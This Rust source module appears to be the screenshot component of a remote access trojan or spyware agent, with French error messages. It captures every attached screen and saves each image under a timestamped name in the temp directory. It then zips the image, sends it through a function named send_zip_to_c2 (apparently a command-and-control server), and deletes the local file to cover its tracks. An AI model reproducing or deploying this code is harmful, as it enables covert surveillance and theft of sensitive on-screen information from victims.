use crate::connexion::{self, zip_file};
use anyhow::Result;
use chrono::Local;
use screenshots::Screen;
use std::path::PathBuf;

fn build_temp_path_with_timestamp() -> PathBuf {
    let timestamp = Local::now()
        .format("screenshot_%d-%m-%Y_%H-%M-%S.png")
        .to_string();
    let mut file_path = std::env::temp_dir();
    file_path.push(timestamp);
    file_path
}

pub async fn take_screenshot() -> Result<()> {
    let screens = Screen::all()?;

    for screen in screens {
        let image = match screen.capture() {
            Ok(img) => img,
            Err(e) => {
                return Err(e);
            }
        };

        let file_path = build_temp_path_with_timestamp();

        if let Err(e) = image.save(&file_path) {
            eprintln!("Erreur lors de la sauvegarde de l'image : {}", e);
            continue;
        }

        if let Err(e) = process_screenshot(&file_path).await {
            eprintln!("Erreur lors du traitement de la capture : {}", e);
        }
    }

    Ok(())
}

async fn process_screenshot(png_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let zip_file = zip_file(png_path).await?;
    let zip_path = zip_file.path();

    connexion::send_zip_to_c2(zip_path).await?;

    std::fs::remove_file(png_path)?;

    Ok(())
}
